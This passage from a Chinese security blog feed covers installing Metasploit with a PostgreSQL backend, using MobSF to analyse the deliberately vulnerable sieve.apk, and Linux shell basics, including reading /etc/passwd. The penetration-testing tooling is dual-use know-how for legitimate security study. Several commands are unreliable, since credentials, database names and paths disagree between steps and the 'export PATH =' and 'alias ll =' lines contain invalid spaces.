2&gt;/dev/null; then</span><br><span class="line">    echo &quot;This script must be executed as the &apos;root&apos; user or with sudo&quot;</span><br><span class="line">    exit 1</span><br><span class="line">  else</span><br><span class="line">    echo &quot;Switching to root user to update the package&quot;</span><br><span class="line">    sudo -E $0 $@</span><br><span class="line">    exit 0</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">case $PKGTYPE in</span><br><span class="line">  deb)</span><br><span class="line">    install_deb</span><br><span class="line">    ;;</span><br><span class="line">  rpm)</span><br><span class="line">    install_rpm</span><br><span class="line">    ;;</span><br><span class="line">  *)</span><br><span class="line">    install_pkg</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><p>复制到文件msfinstall</p><p>或者</p><p>从这里<a href="http://obgutsg63.bkt.clouddn.com/msfinstall" target="_blank" rel="noopener">下载</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Chmod 755 msfinstall</span><br></pre></td></tr></table></figure><p><code>./msfinstall</code>,开始安装</p><p>查看postgresql启动状态</p><blockquote><p>切换到root用户</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xcr@xcr-wen:~$ sudo -s</span><br></pre></td></tr></table></figure><blockquote><p>切换到postgresql用户</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@xcr-wen:~# su postgres</span><br><span class="line">postgres@xcr-wen:/home/xcr$</span><br></pre></td></tr></table></figure><blockquote><p>创建数据库管理用户 -P指定密码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">postgres@xcr-wen:/home/xcr$ createuser msf_user -P</span><br><span class="line">Enter password for new role:</span><br><span class="line">Enter it again:</span><br><span class="line">postgres@xcr-wen:/home/xcr$</span><br></pre></td></tr></table></figure><blockquote><p>修改密码：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@xcrwen:~# sudo -u postgres psql</span><br><span class="line">psql (9.5.5)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">postgres=# ALTER USER msfuser WITH PASSWORD &apos;msfpassword&apos;</span><br><span class="line">postgres-# \q</span><br></pre></td></tr></table></figure><blockquote><p>create db，创建数据库</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">postgres@xcr-wen:/home/xcr$ createdb --owner=msf_user msfdb</span><br><span class="line">postgres@xcr-wen:/home/xcr$</span><br></pre></td></tr></table></figure><p>用户名：msf_user<br>密码：msf_passwd<br>数据库名：msfdb</p><blockquote><p>运行msfconsole</p></blockquote><blockquote><p>查看数据库运行状态，未连接</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_status</span><br><span class="line">[*] postgresql selected, no connection</span><br></pre></td></tr></table></figure><blockquote><p>连接数据库</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_connect msf_user:msf_passwd@127.0.0.1:5432/msfdb</span><br></pre></td></tr></table></figure><blockquote><p>配置配置文件</p></blockquote><p><code>/opt/metasploit-framework/config</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cat &gt; /opt/metasploit4/config/database.yml &lt;&lt; EOF</span><br><span class="line">production:</span><br><span class="line">    adapter: postgresql</span><br><span class="line">    database: msf_database</span><br><span class="line">    username: msf_user</span><br><span class="line">    password: msfpasswd</span><br><span class="line">    host: 127.0.0.1</span><br><span class="line">    port: 5432</span><br><span class="line">    pool: 75</span><br><span class="line">    timeout: 5</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><blockquote><p>在家目录配置一个文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch ./msf4/msfconsole.rx</span><br></pre></td></tr></table></figure><blockquote><p>运行msfconsole自动连接</p></blockquote><p><strong>连接数据库完毕</strong></p><hr><p><a href="http://blog.csdn.net/he520478/article/details/40009529" target="_blank" rel="noopener">http://blog.csdn.net/he520478/article/details/40009529</a><br><a href="https://fedoraproject.org/wiki/Metasploit_Postgres_Setup" target="_blank" rel="noopener">https://fedoraproject.org/wiki/Metasploit_Postgres_Setup</a><br><a href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers</a><br><a href="https://apt.metasploit.com/" target="_blank" rel="noopener">https://apt.metasploit.com/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;linux安装metasploit&quot;&gt;&lt;a href=&quot;#linux安装metasploit&quot; class=&quot;headerlink&quot; title=&quot;linux安装metasploit&quot;&gt;&lt;/a&gt;linux安装metasploit&lt;/h1&gt;&lt;p&gt;@(F1-发表)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;介绍如何在linux下安装metasploit，包括metasp连接postgresql数据库。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/392514.jpg&quot; alt=&quot;linux安装metasploit&quot; title=&quot;linux安装metasploit&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Mobile-Security-Framework-MobSF</title>
    <link href="http://airs-sec.com/2018/07/15/Mobile-Security-Framework-MobSF/"/>
    <id>http://airs-sec.com/2018/07/15/Mobile-Security-Framework-MobSF/</id>
    <published>2018-07-15T15:48:43.000Z</published>
    <updated>2018-07-15T16:00:23.875Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Mobile-Security-Framework-MobSF是一个自动、一体化移动应用 (Android/iOS/Windows) 测试框架，并且可以进行静态分析，动态分析，恶意软件分析和Web API测试。</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1486603.jpg" alt="enter description here" title="Mobile-Security-Framework-MobSF"></p><a id="more"></a><h1 id="如何部署"><a href="#如何部署" class="headerlink" title="如何部署"></a>如何部署</h1><p>MSF利用docker进行部署，docker镜像如下：</p><p>docker镜像地址：</p><p><a href="https://hub.docker.com/r/opensecurity/mobile-security-framework-mobsf/" target="_blank" rel="noopener">https://hub.docker.com/r/opensecurity/mobile-security-framework-mobsf/</a></p><blockquote><p>利用docker进行部署：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull opensecurity/mobile-security-framework-mobsf</span><br><span class="line">docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</span><br></pre></td></tr></table></figure><p><strong>注：在实际的安装部署中，我使用的环境是深度linux操作系统，安装过程时间较长，建议翻墙。</strong></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531669872827.jpg" alt="1"></p><p>安装成功之后，访问localhost:8000即可访问web界面。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531669889027.jpg" alt="2"></p><p>上传app进行测试。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531669902329.jpg" alt="3"></p><p>将apk文件拖入即可上传，上传完之后就开始进行分析。</p><p>分析完成之后，如下：</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531669914892.jpg" alt="4"></p><p>这里使用的apk文件为drozer中提供的sieve.apk文件，sieve.apk文件本身就被设计来进行apk漏洞测试，该文件包含各类漏洞，便于我们进行分析测试。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531669927160.jpg" alt="5"></p><p>这里列出了，各个组件的相关信息。</p><p>往下，还有个查看代码的模块。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531669940401.jpg" alt="6"></p><p>点击<code>“View Java”</code>，查看java的源码，以类名.java类进行划分，点击具体的类，进入到详情页面。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531669992500.jpg" alt="7"></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531670063626.jpg" alt="9"></p><p>点击右侧的<code>“Download Java Code”</code>,即可将java源码下载至本地。</p><p>点击“View Smali”，即可查看Smali源码。同样，是以类名.smali进行区分。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531670070006.jpg" alt="10"></p><p>点击相应的类名.smali，即可进入smali代码的详情页面。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531670085565.jpg" alt="11"></p><p>点击左侧的“Permissions”，可查看android权限。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531670109506.jpg" alt="12"></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531670117449.jpg" alt="13"></p><p>点击左侧<code>“Security Analysis”</code>模块下的<code>“Code Analysis”</code>进行代码分析，这里会列出相应的问题，针对具体的问题，我们可以开始进行漏洞验证。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531670131446.jpg" alt="14"></p><p>找到一条关于SQLite数据库注入相关的，点击右侧的<code>“com/mwr/example/sieve/PWDBHelper.java ”</code>，查看相应的java类代码。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531670155274.jpg" alt="15"></p><p>可以看到<code>DATABASE_NAME=“database.db”</code>，我们通过模拟器的SQLite编辑器找到这个db文件，apk数据一般存储在/data/data/包名/databases目录下。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531670167567.jpg" alt="16"></p><p>双击打开db文件。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531670178392.jpg" alt="17"></p><p>点击“Passwords”字段。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531670190616.jpg" alt="18"></p><p><code>sieve.apk</code>利用SQLite数据库的方式进行数据存储，通过创建<code>SQLiteOpenHelper</code> 的子类并覆盖<code>onCreate()</code>方法，在此方法中，可以执行 SQLite 命令以创建数据库中的表。</p><hr><p><strong>注：</strong></p><p>apk的数据保存方式一般分为以下几种：</p><ul><li>共享首选项：在键值对中存储私有原始数据。</li><li>内部存储：在设备内存中存储私有数据。</li><li>外部存储：在共享的外部存储中存储公共数据。</li><li>SQLite 数据库：在私有数据库中存储结构化数据。</li><li>网络连接：在网络中使用您自己的网络服务器存储数据。</li></ul><p>其他的使用方法还在摸索中，相比<code>http://jaq.alibaba.com</code>和<code>http://appscan.360.cn</code>感觉还时可以的，但很多地方需要能看得懂源代码。</p><p><a href="https://developer.android.com/guide/topics/data/data-storage" target="_blank" rel="noopener">https://developer.android.com/guide/topics/data/data-storage</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Mobile-Security-Framework-MobSF是一个自动、一体化移动应用 (Android/iOS/Windows) 测试框架，并且可以进行静态分析，动态分析，恶意软件分析和Web API测试。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/1486603.jpg&quot; alt=&quot;enter description here&quot; title=&quot;Mobile-Security-Framework-MobSF&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://airs-sec.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>linux就该这么学-3</title>
    <link href="http://airs-sec.com/2018/07/14/linux%E5%B0%B1%E8%AF%A5%E8%BF%99%E4%B9%88%E5%AD%A6-3/"/>
    <id>http://airs-sec.com/2018/07/14/linux就该这么学-3/</id>
    <published>2018-07-14T12:37:31.000Z</published>
    <updated>2018-07-14T12:46:45.530Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>管道符、重定向与环境变量</p></blockquote><h1 id="管道符命令"><a href="#管道符命令" class="headerlink" title="管道符命令"></a>管道符命令</h1><blockquote><p>管道符“|”将前一个命令的输出作为后一个命令的输入，格式：命令A | 命令B，将各个命令连接起来使用，可以构造出很强大的语法。</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/140316bdncc9ao9k2euqke_meitu_1.jpg" alt="管道符、重定向与环境变量" title="管道符、重定向与环境变量"></p><a id="more"></a><p>统计不允许登录用户的个数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# cat /etc/passwd | grep &quot;/sbin/nologin&quot;</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">gopher:x:13:30:gopher:/var/gopher:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin</span><br><span class="line">saslauth:x:499:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/sbin/nologin</span><br><span class="line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">test:x:8888:8888::/home/testuser:/sbin/nologin</span><br><span class="line"></span><br><span class="line">[root@Lc ~]# cat /etc/passwd | grep &quot;/sbin/nologin&quot; | wc -l</span><br><span class="line">17</span><br></pre></td></tr></table></figure><h2 id="输入与输出重定向"><a href="#输入与输出重定向" class="headerlink" title="输入与输出重定向"></a>输入与输出重定向</h2><ul><li>标准输入，STDIN，文件描述符为0</li><li>标准输出，STDOUT，文件描述符为1</li><li>错误输出，STDERR，文件描述符为2</li></ul><blockquote><p>输出重定向</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531572032721.jpg" alt="STDOUT"></p><p><strong>$1代表定位符，$0代表命令，$1代表之后的参数（文件），有多个文件则往后追加$2,$…</strong></p><blockquote><p>输入重定向</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531572073609.jpg" alt="STDIN"></p><blockquote><p>命令行通配符</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531572093860.jpg" alt="通配符"></p><p><strong>通配符可以在很多地方使用，如shell，vim，grep，find命令进行搜索。</strong></p><blockquote><p>特殊字符扩展</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531572128341.jpg" alt="特殊字符扩展"></p><h1 id="实用的PATH变量"><a href="#实用的PATH变量" class="headerlink" title="实用的PATH变量"></a>实用的PATH变量</h1><blockquote><p>环境变量通常是全局变量，在执行一个命令的时候，通常先看下这条命令是否在环境的设置当中，如果是，直接执行命令，如果系统搜索了一遍之后，当前命令不在环境变量的设置当中，那么执行不了当前命令，只能到命令所在的目录下通过绝对路径的方式运行。</p></blockquote><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li>永久性：需要用户修改配置文件，变量永久生效。</li><li>暂时性：用户通过export命令进行设置，关闭shell后失效。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH = $PATH:/root/bin</span><br></pre></td></tr></table></figure><h2 id="按作用域划分"><a href="#按作用域划分" class="headerlink" title="按作用域划分"></a>按作用域划分</h2><blockquote><p>系统变量：全局生效</p></blockquote><p>1、<code>/etc/environment</code></p><p>适合加入全局变量，对整个系统生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/environment</span><br><span class="line">PATH=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games&quot;</span><br></pre></td></tr></table></figure><p>2、<code>/etc/profile和/etc/profile.d/*Shell脚本</code></p><blockquote><p>用户变量：当前用户</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/.profile</span><br><span class="line"></span><br><span class="line">~/.bashrc</span><br></pre></td></tr></table></figure><p><strong>当前用户家目录下的profile文件，仅对当前用户生效。</strong></p><p><a href="https://stackoverflow.com/questions/14637979/how-to-permanently-set-path-on-linux-unix" target="_blank" rel="noopener">https://stackoverflow.com/questions/14637979/how-to-permanently-set-path-on-linux-unix</a></p><h2 id="设置方式："><a href="#设置方式：" class="headerlink" title="设置方式："></a>设置方式：</h2><ul><li><p>确定设置变量类型</p></li><li><p>编辑对应的文件，在文件内容尾部加入：</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PATH = $ PATH:xxx</span><br><span class="line"></span><br><span class="line">export PATH=&quot;/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&quot;</span><br></pre></td></tr></table></figure><p><strong>各个路径之间用“:”隔开</strong></p><h2 id="设置别名"><a href="#设置别名" class="headerlink" title="设置别名"></a>设置别名</h2><p>1、alias 设置别名</p><blockquote><p>格式：alias 别名=命令</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias ll = &quot;ls -l&quot;</span><br></pre></td></tr></table></figure><p>2、unalias 取消别名设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unalias ll</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;管道符、重定向与环境变量&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;管道符命令&quot;&gt;&lt;a href=&quot;#管道符命令&quot; class=&quot;headerlink&quot; title=&quot;管道符命令&quot;&gt;&lt;/a&gt;管道符命令&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;管道符“|”将前一个命令的输出作为后一个命令的输入，格式：命令A | 命令B，将各个命令连接起来使用，可以构造出很强大的语法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/140316bdncc9ao9k2euqke_meitu_1.jpg&quot; alt=&quot;管道符、重定向与环境变量&quot; title=&quot;管道符、重定向与环境变量&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="阅读" scheme="http://airs-sec.com/categories/%E9%98%85%E8%AF%BB/"/>
    
    
  </entry>
  
  <entry>
    <title>linux就该这么学-2</title>
    <link href="http://airs-sec.com/2018/07/13/linux%E5%B0%B1%E8%AF%A5%E8%BF%99%E4%B9%88%E5%AD%A6-2/"/>
    <id>http://airs-sec.com/2018/07/13/linux就该这么学-2/</id>
    <published>2018-07-13T14:36:15.000Z</published>
    <updated>2018-07-13T15:23:19.612Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>用户不能直接操作底层，通过shell可以达到控制底层。应用程序处于最上层，和用户最近的一层，应用程序和内核之间的就是系统调用接口（shell）。</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/36142.jpg" alt="linux就该这么学" title="inux就该这么学"></p><a id="more"></a><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531492677698.jpg" alt="linux shell"></p><blockquote><p>计算机用户可以通过shell或者应用程序本身将摄入传送给linux内核，达到控制linux内核，从而驱动系统硬件进行数据处理，系统硬件将处理结果输出给用户。应用程序在功能设计上，本质上是shell的图形化，有些功能操作并没有直接操作shell来的快，所以，为什么说，有些人喜欢用命令行，而抛弃图形化界面。</p></blockquote><blockquote><p>现在用的最多的就是bash了，很多linux系统默认就是bash shell。</p></blockquote><blockquote><p>通过shell就命令传送给linux内核执行，下面开始列出些linux常用的命令。</p></blockquote><h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><h2 id="1、echo"><a href="#1、echo" class="headerlink" title="1、echo"></a>1、echo</h2><p>在屏幕上打印字符或变量</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@Lc</span> ~]<span class="meta"># echo <span class="string">'hello,world'</span></span></span><br><span class="line">hello,world</span><br></pre></td></tr></table></figure><h2 id="2、date"><a href="#2、date" class="headerlink" title="2、date"></a>2、date</h2><p><strong>date [参数] [选项]</strong></p><ul><li>-d <string>：显示字符串所指的日期和时间</string></li><li>-s <string>：根据指定字符串设置日期和时间</string></li></ul><blockquote><p> 字符串用双引号括起来</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# date</span><br><span class="line">2018年 04月 05日 星期四 00:28:57 CST</span><br><span class="line"></span><br><span class="line">[root@Lc ~]# date +%Y-%m-%d-%X</span><br><span class="line">2018-04-05-00时30分52秒</span><br><span class="line"></span><br><span class="line">[root@Lc ~]# date -d "1 day ago" +"%Y-%m-%d"</span><br><span class="line">2018-04-03</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">date设置时间</span></span><br><span class="line"></span><br><span class="line">[root@Lc ~]# date -s "20180404 16:32"</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash">H 小时，24小时制（00~23）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">I 小时，12小时制（01~12）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">k 小时，24小时制（0~23）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">l 小时，12小时制（1~12）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">M 分钟（00~59）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">p 显示出AM或PM</span></span><br><span class="line"><span class="meta">%</span><span class="bash">r 显示时间，12小时制（hh:mm:ss %p）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">s 从1970年1月1日00:00:00到目前经历的秒数</span></span><br><span class="line"><span class="meta">%</span><span class="bash">S 显示秒（00~59）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">T 显示时间，24小时制（hh:mm:ss）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">X 显示时间的格式（%H:%M:%S）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">Z 显示时区，日期域（CST）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">a 星期的简称（Sun~Sat）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">A 星期的全称（Sunday~Saturday）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">h,%b 月的简称（Jan~Dec）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">B 月的全称（January~December）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">c 日期和时间（Tue Nov 20 14:12:58 2012）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">d 一个月的第几天（01~31）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">x,%D 日期（mm/dd/yy）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">j 一年的第几天（001~366）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">m 月份（01~12）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">w 一个星期的第几天（0代表星期天）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">W 一年的第几个星期（00~53，星期一为第一天）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">y 年的最后两个数字（1999则是99）</span></span><br></pre></td></tr></table></figure><p><strong>时间同步</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# date -s &quot;20180405 14:02:20&quot;</span><br><span class="line">2018年 04月 05日 星期四 14:02:20 CST</span><br><span class="line"></span><br><span class="line">[root@Lc ~]# clock -w</span><br><span class="line">[root@Lc ~]# date</span><br><span class="line">2018年 04月 05日 星期四 14:02:26 CST</span><br><span class="line"></span><br><span class="line">[root@Lc ~]# hwclock</span><br><span class="line">2018年04月05日 星期四 14时02分31秒  -0.063613 seconds</span><br><span class="line"></span><br><span class="line">[root@Lc ~]# clock</span><br><span class="line">2018年04月05日 星期四 14时02分34秒  -0.562994 seconds</span><br></pre></td></tr></table></figure><p>一个是OS系统时间,一个是BIOS时间，用hwclock –systohc or -hctosys 用这个指令可以同步两者的时间</p><h2 id="3、reboot"><a href="#3、reboot" class="headerlink" title="3、reboot"></a>3、reboot</h2><blockquote><p>用于重启系统</p></blockquote><h2 id="4、wget"><a href="#4、wget" class="headerlink" title="4、wget"></a>4、wget</h2><blockquote><p>用于从网络上下载文件</p></blockquote><p>wget [参数] [url链接]</p><h2 id="5、elinks"><a href="#5、elinks" class="headerlink" title="5、elinks"></a>5、elinks</h2><blockquote><p>纯文本浏览器</p></blockquote><h2 id="6、shutdown"><a href="#6、shutdown" class="headerlink" title="6、shutdown"></a>6、shutdown</h2><blockquote><p>关机</p></blockquote><h1 id="系统状态检测命令"><a href="#系统状态检测命令" class="headerlink" title="系统状态检测命令"></a>系统状态检测命令</h1><h2 id="1、ifconfig"><a href="#1、ifconfig" class="headerlink" title="1、ifconfig"></a>1、ifconfig</h2><blockquote><p>获取网卡配置或网络状态</p></blockquote><blockquote><p>通过ifconfig配置的网卡信息，当前环境生效，重启后失效。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth[x] xxx.xxx.xxx.xxx/xx</span><br></pre></td></tr></table></figure><h2 id="2、uname"><a href="#2、uname" class="headerlink" title="2、uname"></a>2、uname</h2><blockquote><p>查看系统内核版本</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# uname -a</span><br><span class="line">Linux Lc 2.6.32-431.el6.x86_64 #1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">[root@Lc ~]# uname -r</span><br><span class="line">2.6.32-431.el6.x86_64</span><br><span class="line"></span><br><span class="line">[root@Lc ~]# cat /etc/redhat-release</span><br><span class="line">CentOS release 6.5 (Final)</span><br></pre></td></tr></table></figure><h2 id="3、uptime"><a href="#3、uptime" class="headerlink" title="3、uptime"></a>3、uptime</h2><blockquote><p>用于查看系统负载情况</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# uptime</span><br><span class="line">16:41:30 up 18 min,  2 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">系统当前时间    系统已经运行时间  当前在线用户   系统1分钟、5分钟和15分钟内平均负载情况 